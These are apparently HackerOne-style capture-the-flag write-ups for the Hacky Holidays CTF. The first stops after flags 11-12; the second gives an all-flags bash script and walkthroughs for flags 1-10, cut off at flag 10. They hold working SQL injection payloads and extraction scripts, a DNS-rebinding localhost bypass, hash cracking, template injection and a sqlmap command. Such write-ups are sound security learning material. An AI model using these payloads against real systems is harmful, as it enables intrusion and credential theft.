But all the images have the URL in the following format: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
If we decode that base64 we will get the following data:
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
Now I just have to say it again I had literally no clue what the vulnerability was. I spent hours looking for everything but got nothing. Then on hackerone discord I saw the following message by @mcipekci
Code 82 Bytes
1mcipekci Today at 5:57 PM  
2tbh 9th and 11th are same issue but different variants
So I started looking for SQLi in the hash parameter and the data parameter, for some reason I spent more time on the data parameter of the /picture but got nothing. So again I asked for some hint from @neolex and he told me try the another hash parameter.
After trying various payloads I found the following to return the table names:
Code 181 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436%27%20UNION%20ALL%20SELECT%20NULL,NULL,GROUP_CONCAT(%27\n%27,table_name)%20FROM%20information_schema.tables--%20-
<image_39>
But again dumping tables didn't help at all cause there wasn't anything interesting inside those tables. Again hitting, what feels like a dead end I started to enjoy the chatter on the discord channel when @adam decided to drop another hint.
<image_40>
Now this is an image from the insecption so I couldn't make sense out of it. After enjoying banter on the discord channel about how evil adam is and how great inception was as a movie I decided to get back on the challenge and focus on the hint more.
The thing was that I know the Vuln is SQLi and inception is a movie related to dreams in dreams and what not. But if we have to think that in sense of SQL that would mean nested queries. So I started testing various stuff like
Code 204 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436' UNION ALL SELECT NULL,NULL,GROUP_CONCAT(UNION ALL SELECT NULL,NULL,NULL) FROM information_schema.tables WHERE table_name like 'a%'-- -
or
Code 65 Bytes
1UNION ALL SELECT NULL,NULL,( UNION ALL SELECT NULL,NULL,NULL)-- -
These queries are far from anything so I decided to spend sometime with the nested queries and that's when I figured out:
Code 67 Bytes
1-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,1 -- -",'12',1-- -
This payload gives us:
<image_41>
Now there are 2 images which we already had but one image can't be loaded and if we look at the URL of that image it looks like:
Code 181 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEiLCJhdXRoIjoiY2I4YTJhOGY1ODZhN2NkZjdjNzY4MmMxOTZiMmYyZWQifQ==
Decoding the encoded part we can see:
Code 85 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/1","auth":"cb8a2a8f586a7cdf7c7682c196b2f2ed"}
That means whatever we provided in the SQLi payload is some how gets attached to the images path. Now @adam had already said this several times on discord that auth token can only be generated by the server that means we only have to mess with the image path.
If we take a step back we know there is /api/ endpoint exists which have the following data:
<image_42>
But we can't access that API or any endpoint of that API without authentication. So now things starts to get connected we use sqli to get injection inside the path with an auth token and then we try to access that path. That means we can access any endpoint as authenticated user. But for this to work we'll have to find the valid /api/ endpoint. Since this wasn't possible using ffuf or anything like that I wrote a small script:
Code 738 Bytes
1import requests
2import re
3from bs4 import BeautifulSoup
4
5HOST = "https://hackyholidays.h1ctf.com"
6hash_URL = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/{}' -- -",'12',1-- -"
7
8with open("lists/objects-lowercase.txt", "r") as f:
9    data = f.read().split("\n")
10
11for endpoint in data:
12    r = requests.get(hash_URL.format(endpoint.strip()))
13    soup = BeautifulSoup(r.content, "html.parser")
14    next_url = soup.findAll("img", {"class": "img-responsive"})
15    if next_url:
16        new_url = HOST + next_url[-1]["src"]
17        nr = requests.get(new_url)
18        if nr.content != "Expected HTTP status 200, Received: 404":
19            print(endpoint, "--", new_url)
The wordlist user in this is objects-lowercase.txt
<image_43>
Code 678 Bytes
1('password', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/cGFzc3dvcmQiLCJhdXRoIjoiZWIxMzUyMDExN2ZmMjVmNjk1ZDk5NWFmMjAxMmNmYTMifQ==')
2('username', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWUiLCJhdXRoIjoiODE5NmRkMzE3NWRiODMxOWYzODgwOTUyNmMyMjgyMTgifQ==')
3('', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/IiwiYXV0aCI6ImMwMmI3Y2MwN2QwYTg4ZjE4NWVhNDU4N2JjMjFkM2I5In0=')
If we visit the URL we'll see
<image_44>
Now this could mean that I found the endpoint but as we know API's need parameters on the endpoints to be able to return some kind of data. So I edited the script a bit, because this time I wasn't getting 404 but 400
so I changed the last if condition to:
Code 110 Bytes
1        if nr.content != "Expected HTTP status 200, Received: 400":
2            print(endpoint, "--", new_url)
This gave me:
<image_45>
Code 218 Bytes
1('user\n', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==')
The password and username gave me status code 204 not on the request but as the content. And if we checkout the /api table it says that 204 means Successful request but with no data found that means we just need to find the valid username and password to get the information/data.
For this I downloaded users.txt and rockyou.txt from SecList and tried to find the valid values one at a time. After hours of long run when I didn't find anything @xEHLE told me that I will never find those credential in any list and I need to find some other way. They also said also think about how a lot of username lookups work.
Now the way most looks usually works in DB are something like:
Code 58 Bytes
1SELECT user FROM TABLE_NAME WHERE user="THE INPUT WE GIVE"
something like that but the problem is if that was the case then I think using wordlist would have worked. That is why the best way lookups would work in this case is if someone internally is using something like:
Code 58 Bytes
1SELECT user FROM table_name WHERE user LIKE '<user_input>'
And I can see the issue with this, the problem is that now if user input is a% it might just return TRUE. To try this I modified my query in my script.
Code 746 Bytes
1import requests
2from bs4 import BeautifulSoup
3
4HOST = "https://hackyholidays.h1ctf.com"
5hash_URL = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436%27%20UNION%20SELECT%20"1%27%20UNION%20SELECT%20%27rad.jpg%27,1,%27../api/user?username={}%%27%20--%20-",%2712%27,1--%20-"
6
7strings = "0123456789abcdefghijklmnopqrstuvwxyz_"
8
9for endpoint in strings:
10    r = requests.get(hash_URL.format(endpoint.strip()))
11    soup = BeautifulSoup(r.content, "html.parser")
12    next_url = soup.findAll("img", {"class": "img-responsive"})
13    if next_url:
14        new_url = HOST + next_url[-1]["src"]
15        nr = requests.get(new_url)
16        if nr.content != "Expected HTTP status 200, Received: 204":
17            print(endpoint, "--", new_url)
P.S - This script doesn't work recursively so it finds one character and then I would add that character and rerun the script. At this point I was loosing my mind and didn't wanted to miss anything so I decided to go slow :)
Major change to notice in this is the query:
Code 92 Bytes
1-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username={}%' -- -",'12',1-- -
With the help of this script I found one character at a time, the username was grinchadmin and in the similar way I found the password. The change in the query was just a bit:
Code 115 Bytes
1-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username=grinchadmin%26password={}%' -- -",'12',1-- -
one character at a time I found the password i.e s4nt4sucks
Using these credentials I logged in to the attack box(https://hackyholidays.h1ctf.com/attack-box/login)
<image_46>
Thanks to @neolex @mcipekci @xEHLE and every one who gave hint for this challenge I don't think I could have done this alone.
Flag 12
For this we start from the very same page on which we found the flag for 11th challenge. We can see that there are three IP and red buttons to attack those.
If we click on any of those buttons then a new tab opens up which shows that some ping requests were sent
<image_47>
Now if we look at href in those ATTACK buttons they looks like:
Code 150 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
Decoded base64 looks like:
Code 168 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}                                                                                                     
Now as we can see there is a target and a hash, so I checked if the hash is the md5 of the target value but it wasn't. I tried replacing the hash but got nothing but errors. If the hash is of the target then there is a possibility that it was salted meaning if we calculate the md5 without hash it will be different.
To test this I decided to use hashcat and see if I can recover any salt
Code 49 Bytes
1hashcat -m 10 -O hash.txt rockyou.txt -o hash.out
<image_48>
we can see that we found the salt to be mrgrinch463 this means that now we can generate our own target. So the very first one that I tried was hackyholidays.h1ctf.com
I used this to generate the hash and then base64 encoded it to send it to the URL.
Code 78 Bytes
1{"target":"hackyholidays.h1ctf.com","hash":"59bcc3074be23595ebb5e4259abc0de6"}
Code 162 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJoYWNreWhvbGlkYXlzLmgxY3RmLmNvbSIsImhhc2giOiI1OWJjYzMwNzRiZTIzNTk1ZWJiNWU0MjU5YWJjMGRlNiJ9
But the attack was aborted because it detected that Local target was being attacked. So the next step is clear we need to bypass this so we can attack the localhost cause that is the house of grinch and we need to destroys grinch network.
<image_49>
In the above image we see an attack happening on 192.168.1.1.xip.io what we can understand from this is:
1) The input target is first resolved.
2) Spinning up botnet is when the system checks wether the target is localhost or not.
3) Then we see it says: Launching attack against: 192.168.1.1.xip.io / 192.168.1.1 that means it launched the attack on the target that was provided by the user as an input instead of using the host which is receives in STEP-1 after resolving.
If we have to write a pseudo code for this kind of functionality it would look like:
Code 118 Bytes
1BLACKLIST = ["127.0.0.1", "OR WHATEVER YOU WANT"]
2if RESOLVE($user_input) != BLACKLIST:
3	Launch_attack_on($user_input)

This is like first we sanitize something and then we use the unsanitized input. Now we know what the problem is we just need to find a way to exploit it. This kind of vulnerabilities are known as TOCTOU(Time of check, Time of use).
The specific way to exploit the vulnerability we need to use DNS rebinding. In simple way DNS rebinding is type of TOCTOU in which a certain domain resolves to something and when the same domain is resolved again it would resolve to something.
Ex: I found this service called 1u.ms
Code 54 Bytes
1host -t A make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
<image_50>
We can see how a single domain first resolves to 1.2.3.4 and then it resolves to 169.254.169.254.

We have to do the same kind of attack so first our domain will resolve to any random IP which will pass the blacklist but later when the attack is lauched it will resolve to 127.0.0.1 putting down the grinch's network.
I tried to use something like make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms which will resolve to 1.2.3.4 first and then localhost later. I generated the hash for this and base64 encoded it and then passed it in the payload parameter but it didn't work. It wouldn't resolve to 127.0.0.1. I tried the same process various time but nothing. So I felt that this(1u.ms) must be the problem and then I googled dns rebinding service. The first URL that we get is https://lock.cmpxchg8b.com/rebinder.html, this service says that it will take two IP and will then resolve randomly to any of these IP's
I used 1.2.3.4 in the A and 127.0.0.1 to B
<image_51>
and then got 01020304.7f000001.rbndr.us. So I used this as the target and generated the hash for this target using mrgrinch463 salt using this website.
Code 81 Bytes
1{"target":"01020304.7f000001.rbndr.us","hash":"69c31cdcfad3ef1deb652f4aca52d2cc"}
Then I used cyberchef recipe to base64 encode this.
The final URL looked like:
Code 166 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9
I had to paste this URL various time since it would randomly resolve to 127.0.0.1 sometime and check would fail but in the end I got it.
<image_52>
🎉🎉🎉🎉
Impact
This CTF was amazing. I really enjoyed it, learned loads of stuff and would really like to thank @adam for making this awesome CTF. Thanks to @neolex @0xatul @shamollash @xEHLE and everyone who gave any kind of hint or helped me in any way. I xouldn't have solve this all by my self.



==================================================

Report File: 1066504.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

Grinch Networks compromised!
For fast triage/validation and inspired by @manoelt in other CTF, I made a bash script to find and print all the 12 flags of this CTF.
The script uses curl, wget, google-chrome headless (for flag 2), unzip, grep and sed. If any of these commands is missing, the script might crash or not get all the flags.
Code 4.07 KiB
1echo -e "NOTE: This script uses: curl, wget, google-chrome headless, unzip, grep and sed. if any of this is missing, the script might not run well\n";
2
3echo -e "[*] Getting all flags...\n";
4
5## Flag 1
6
7curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/robots.txt' | grep "flag[^ ]*" -o | sed 's/^/Flag 1\: /';
8
9## Flag 2 - Needs chrome headless browser.
10
11google-chrome --headless --disable-gpu --dump-dom https://hackyholidays.h1ctf.com/s3cr3t-ar3a --no-sandbox | egrep -o "flag\{[a-zA-Z0-9\-]*}" | sed 's/^/Flag 2\: /';
12
13## Flag 3
14
15curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0g' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 3\: /';
16
17## Flag 4
18
19curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 4\: /';
20
21## Flag 5 - this one is a bit hard. uses 'unzip' to unzip the file, reads it and then deletes everything.
22
23wget 'https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip' 2> /dev/null;
24unzip -P "hahahaha" my_secure_files_not_for_you.zip &> /dev/null;
25cat flag.txt | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 5\: /';
26rm flag.txt xxx.png my_secure_files_not_for_you.zip;
27
28## Flag 6
29
30curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' $'https://hackyholidays.h1ctf.com/my-diary/?template=secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 6\: /';
31
32## Flag 7
33
34curl -X POST -s -k -d "preview_markup=Hello+%7B%7Bflag%7D%7D&preview_data=%7B%22flag%22%3A%22%7B%7Btemplate:38dhs_admins_only_header.html%7D%7D%22%7D" "https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview" | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 7\: /';
35
36## Flag 8
37
38cookie=$(curl -i -s -k -X $'POST'     -H $'Host: hackyholidays.h1ctf.com3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 34'     --data-binary $'username=grinch&password=BahHumbug'     $'https://hackyholidays.h1ctf.com/forum/login' | egrep "token[^ ]*" -o);
39curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/forum/3/2' -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 8\: /';
40
41## Flag 9
42
43curl 'https://hackyholidays.h1ctf.com/evil-quiz/admin' -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "username=admin&password=S3creT_p4ssw0rd-%24" -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o  | sed 's/^/Flag 9\: /';
44
45## Flag 10
46
47cookie=$(curl -i -s -k -X $'POST'     -H $'Host: hackyholidays.h1ctf.com' -H $'Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 47' -H $'Upgrade-Insecure-Requests: 1'     --data-binary $'action=login&username=zonduupoc&password=123123'     $'https://hackyholidays.h1ctf.com/signup-manager/' | egrep "token[^ ]*" -o);
48curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/signup-manager/' -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 10\: /';
49
50## Flag 11
51
52cookie=$(curl -i -s -k -X $'POST'     -H $'Host: hackyholidays.h1ctf.com' -H $'Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 40' -H $'Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687' -H $'Upgrade-Insecure-Requests: 1'     -b $'attackbox=d09d508e78f3975e0199a5e91dde9687'     --data-binary $'username=grinchadmin&password=s4nt4sucks'     $'https://hackyholidays.h1ctf.com/attack-box/login' | egrep "attackbox[^ ]*" -o)
53curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/attack-box' -s -k |  egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 11\: /';
54
55## flag 12
56curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709' -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 12\: /';
Save it in get-all-flags.sh, run chmod +x get-all-flags.sh; ./get-all-flags.sh. If all works as expected, this should be the output:
<image_0>

Flag 1 - robots.txt leak
The first flag was found in the /robots.txt directory by common crawl of burp-suite. Once we navigate to it, there is the flag and a hint for the second one:
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
note: In general, this file contains endpoints that that might or might not disclose sensitive endpoints.

Flag 2 - Into the DOM
From the /robots.txt file, we find out of /s3cr3t-ar3a. Once we visit it, we note that the site is under construction and there isn't anything sensitive at first look but there is a hint ...If you're allowed access you'll know where to look for the proper page!.
So we check the source-code and nothing, then we use the inspect element and there is the flag hidden inside a div tag:
Code 131 Bytes
1<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">

Flag 3 - who is always the first user?
This flag is located in /people-rater where Grinch rates people. Every time we click to know the Grinch's rating of someone, the following GET request is sent to the server:
Code 89 Bytes
1GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
2Host: hackyholidays.h1ctf.com
3{redacted}
The value of the ID is base64 encoded. Once decoded we notice that it includes a number: {"id":2} . If we increase that number we will get the others people's rating, but trying the number 1, gives but the rating of Grinch itself (the first user), with the third flag in the response too.
Code 78 Bytes
1GET /people-rater/entry?id=eyJpZCI6MX0g HTTP/1.1
2Host: hackyholidays.h1ctf.com
Code 135 Bytes
1{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}

Flag 4 - improper access to the API
We start this adventure in /swag-shop, it is a broken shop with 3 items and if you try to purchase any of them you get a login prompt which stops you from continuing. I try searching for sqli, guessing the credentials (the usual), but nothing worked.
Then I moved to the api (since we didn't have API endpoints before) and start brute-forcing it. I didn't get anything from the burp wordlist so then I tried the seclists's ones from Daniel Miessler and was able to find 2 interesting api endpoints: /sessions and /user.
In /sessions we find 8 base64 encoded IDs that look interesting, once I decoded one by one I noticed that the larger one contained a random user ID.
Code 229 Bytes
1{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
Now we go back to the /user endpoint that was returning "error":"Missing required fields" meaning something was missing there (the user ID). So after playing a bit and trying different things, I finally came across that that you had to add it with the parameter name uuid instead of id
(took me a lot longer than expected).
Code 113 Bytes
1GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
2Host: hackyholidays.h1ctf.com
3{redacted}
Code 216 Bytes
1{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}

Flag 5 - Not so secure login
This challenge starts at /secure-login. We encounter a login panel and nothing else. As the usual, I check for sqli, and default creds but unfortunately it didn't work.
If we look at the POST request response, we will notice the server is telling us that the username is incorrect Invalid Username, giving us an idea that we can brute-force a little bit to try find the username and then the password.
So again we use a seclist wordlist and quickly find out the username is access, and later found that the password is computer.
Ok and the flag? Well it is not over.
Now we are authenticated in the site with the following cookie:
securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D
If we decode the value we notice 2 things:
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":falsZX0%
We are not the admin
The syntax is broken so we need to fix it
We change false to true and fix the syntax and now we are the admin and we are able to download a zip file called my_secure_files_not_for_you.zip. This file is password protected so we have to brute-force it.
For this I used john the ripper with a bash script I found in the wild and another wordlist from seclists top-10kpasswords
Code 337 Bytes
1#!/bin/bash
2echo "ZIP-JTR Decrypt Script";
3if [ $# -ne 2 ]
4then
5echo "Usage $0 <zipfile> <wordlist>";
6exit;
7fi
8unzip -l $1
9for i in $(john --wordlist=$2 --rules --stdout) 
10do
11 echo -ne "\rtrying \"$i\" " 
12 unzip -o -P $i $1 >/dev/null 2>&1 
13 STATUS=$?
14 if [ $STATUS -eq 0 ]; then
15 echo -e "\nArchive password is: \"$i\"" 
16 break
17 fi
18done
So we run ./script.sh my_secure_files_not_for_you.zip wordlist.txt and in less than few minutes we get that the password is "hahahaha" and inside the file we find the flag: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}.

Flag 6 - Regex nightmare
In this challenge we are in /my-diary/?template=entries.html and we only control the value of this parameter. After some time of fuzzing, I found out that the file index.php is accessible to the public so we browse to it.
The page is blank but in the source code we can see the filter the server is doing preventing malicious hackers to access admin.php: view-source:https://hackyholidays.h1ctf.com/my-diary/?template=index.php
So unless you are a genius, the fastest way to solve this is by trying and trying until you get it, so that's what I did.
I used a online php editor to try and see how the regex was working and how to bypass it https://paiza.io/es/projects/new. After a few minutes I came to a solution (probably not the cleanest one, but works):
Code 267 Bytes
1<?php
2
3    $page = 'secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php';
4    
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    $page = str_replace("admin.php","",$page);
7    $page = str_replace("secretadmin.php","",$page);
8    echo $page
9?>
This bypasses the 3 filters and lets me access the secretadmin.php file containing the flag:
Code 140 Bytes
1GET /my-diary/?template=secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php HTTP/1.1
2Host: hackyholidays.h1ctf.com
3{redacted}
Code 84 Bytes
1{redacted}
2<h4 class="text-center">
3flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
4</h4>

Flag 7 - Access blocked content with an email template
This challenge starts in /hate-mail-generator. There we can see the "guess that" email, with a really weird markup:
Code 134 Bytes
1{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
But when clicking the preview button both {{template:cbdj3_grinch_header.html}} and {{template:cbdj3_grinch_footer.html}} were replaced with images.
<image_1>
Interesting, at first look seems like server-side template injection might be possible with {{}} to try and read something sensitive.
After a bit of fuzzing resulting in finding https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and understanding what was happening in https://hackyholidays.h1ctf.com/hate-mail-generator/new when trying to create an email I came with the solution, but let me explain my thought process step by step.
In https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ we have 3 files. The 3 of them return code 403 when trying to read/view them directly, bue we already know the content of 2 of them because we already saw them in https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030. There is one last file that we didn't see yet: 38dhs_admins_only_header.html, and that's our objective.
In /hate-mail-generator/new it is possible to preview the content of what we write (we can't create anything).
The POST request body to preview goes as follow (we can url-decode and works anyway):
Code 175 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4preview_markup=Hello{{name}}+....+whatever&preview_data={"name":"Alice","email":"alice@test.com"}
Code 24 Bytes
1HelloAlice .... whatever
{{name}} was replaced with Alice, which is declared in the "preview_data" value. Changing Alice for other word and repeating the request, would also cause that word to be replaced in {{name}} when previewing it.
Ok what if we try to modify those values and see what happens?
Code 189 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3preview_markup=Hello+{{name}}+email:+{{email}}&preview_data={"name":"zonduu","email":"murphy@hacktheplanet.com"}
Code 44 Bytes
1Hello zonduu email: murphy@hacktheplanet.com
Basically the logic is, what you declare in "preview_data" then you can call it in "preview_markup". So then we go back to /hate-mail-generator/templates/ and get the name of the last file we have pending to see. This endpoint was useful to know how to put the correct syntax when declaring the template.
Code 167 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3preview_markup={{flag}}&preview_data={"flag":"{{template:38dhs_admins_only_header.html}}"}
<image_2>

Flag 8 - Github creds leak
We start this challenge in /forum/. We have 2 Posts that we can see and one private with the message You need to be an admin to view these posts.
A quick look-up throw all application and after failed attempts of IDORs like /forum/{1-200} or guessing the credentials of Grinch or Max I came across with the admin login interface https://hackyholidays.h1ctf.com/forum/phpmyadmin after a quick fuzz with the burp's content discovery wordlist.
At this point I was really stuck, because I couldn't guess the default creds of phpmyadmin, so I asked for a hint to a friend and he sent me a photo of the github logo...
A quick google search revealed that @Adam (the creator of this whole challenge) had a github repo with source code of this application https://github.com/Grinch-Networks/forum. I don't know much php so this step took me longer than expected but in this commit: https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae the credentials to log in are disclosed, exactly in this line:
self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
So we go back to https://hackyholidays.h1ctf.com/forum/phpmyadmin, log in with the username forum and password forum and we are in.
There we have the 2 available usernames (grinch and max), and their passwords that are md5 encrypted:
{F1122758}
Ok no problem, I downloaded hashcat in my new notebook and rockyou.txt wordlist and run it. After 3 seconds, hashcat tried the +14,3 Million passwords but couldn't get it. At this time I got a bit confused because I thought that I might have to do a complete brute-force (letter by letter, without wordlist).
Lucky for me @Adam commented this on the official Hackerone Discord.
<image_3>
So I added a hashcat rule: toggle5.rule (F1122762) that takes every single line of you wordlist and makes it case sensitive. If your wordlist has the word abc, this rule will make hashcat try Abc, aBc, abC, ABC, etc.
Code 113 Bytes
1.\hashcat.exe -m 0 -a 0 -o out .\hash .\rockyou.txt --force -potfile-disable -r toggle5.rule --workload-profile=3
and a few seconds later I got the password which was BahHumbug and then in the private post there was the flag:
<image_4>

Flag 9 - Second order SQLi
We start this challenge in /evil-quiz. We have a quiz that receives input in the field name, and if we click enter, it makes a POST request to the server like this:
Code 116 Bytes
1POST /evil-quiz HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Cookie: session=b519f0f0b323624b25663d3565cc8c2a
4
5name=asdasd
The next request is the actual 3 question quiz (which has no effect at all, so we don't talk about it) and then we have the /evil-quiz/score endpoint that will tell you how many people made the quiz with your name.
So after quite a lot of time manually fuzzing and trying to automate a bit of it, we get to know that the server is vulnerable to SQLi, a second order SQLi...
If the server receives a true statement like 99' OR 1=1-- - then the server will return a lot of users in the response, like for example:
There is 565042 other player(s)
If we send a false statement like 99' OR 5=1-- - then the server will return (in the second request, remember the quiz one doesn't matter):
There is 0 other player(s)
So well, now we can either make our own script, and start digging into the database part by part or we can use a tool designed to do this job easier: sqlmap
To run it smoothly and without false positives, is important to run it with 1 thread in this case. Multiple threads would cause false positives as each payload depends on a second request to see if it is a false/true statement.
We save request 1 in req1 file, and the second request in req2. We need to tell sqlmap where request 1 is with the -r flag, and where the second request is with --second-req flag. Threads 1, lvl 3 and risk 3. Then I added the --regexp flag which tells sqlmap when it is a true statement, and the regex is to math "There is {more than 2 digits here}". --force-ssl is important because sqlmap makes Plain HTTP requests as default and --technique=B because we know it is a boolean SQL injection.
The final command to extract the username and password looks like this:
python.exe .\sqlmap.py -r req1 --second-req req2 --threads 1 --level 3 --risk 3 --regexp="There is [0-9]{1,}[^ ]" -p name --random-agent --proxy https://127.0.0.1:8080 --force-ssl --technique=B -D quiz -T admin --dump
{F1127472}
Giving me the credential pair of: admin/S3creT_p4ssw0rd-$, then we log in and there is the flag
<image_5>

Flag 10 - Code review
The flag 10 hunting starts in /signup-manager/. After spending some time wasting my time fuzzing, I found out that in the source-code there is a block commented:
<!-- See README.md for assistance -->
We browse to signup-manager/readme.MD and it automatically downloads a .md file. It points out some interesting files, but the most important one is definitely: signupmanager.zip
